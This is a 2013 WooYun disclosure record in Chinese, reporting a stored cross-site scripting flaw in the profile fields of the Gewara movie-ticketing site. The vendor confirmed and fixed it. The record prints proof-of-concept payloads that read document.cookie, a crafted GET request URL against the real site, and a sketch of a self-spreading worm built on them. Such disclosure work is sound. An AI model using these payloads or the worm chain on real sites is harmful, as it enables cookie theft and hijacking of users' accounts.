{"id": 64633, "wybug_id": "wooyun-2013-025241", "wybug_title": "格瓦拉存储XSS的利用", "wybug_corp": "格瓦拉", "wybug_author": "小川", "wybug_date": "2013-06-06 10:54", "wybug_open_date": "2013-07-21 10:54", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-21：\t细节向公众公开  简要描述： 蠕一蠕不成问题 详细说明：  在修改个人资料处有3处存储跨站点位置1兴趣爱好：添加兴趣<div onmouseover=\"javascript:alert(document.cookie)\">CCAV大学</div>\n\n2教育信息在大学处添加<div onmouseover=\"javascript:alert(document.cookie)\">CCAV大学</div>\n\n3职业信息添加单位名称<div onmouseover=\"javascript:alert(document.cookie)\">CCAV大学</div>\n\n这3处貌似都过滤了<script></script>.但是一些特殊字符还是不能过滤。在这3处中只有兴趣爱好会在自己的首页中显示。其他的只能自己日自己了（但实际上想利用还是可以利用的）我们看我们账户的首页：http://www.gewara.com/home/sns/othersPersonIndex.xhtml?memberid=40949089\n\n还有一点就是这3个请求全都是get方式的。所以可以构造请求http://www.gewara.com/home/acct/updateFavorInfo.xhtml?tag=%3Cdiv%20onmouseover%3D%22javascript%3Aalert%28document.cookie%29%22%3ECCAV%E5%A4%A7%E5%AD%A6%3C%2Fdiv%3E构造兴趣为 <div onmouseover=\"javascript:window.locarion('上面构造的get请求')\">CCAV大学</div>想让全站CCAV还是可以的。缺点就是,不是访问自动触发，要用户鼠标划过兴趣爱好才行。   漏洞证明：  http://www.gewara.com/home/sns/othersPersonIndex.xhtml?memberid=40949089\n\n   修复方案：  来两张电影票，周末的   版权声明：转载请注明来源 小川@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-06-07 10:49 厂商回复： 感谢，已经处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}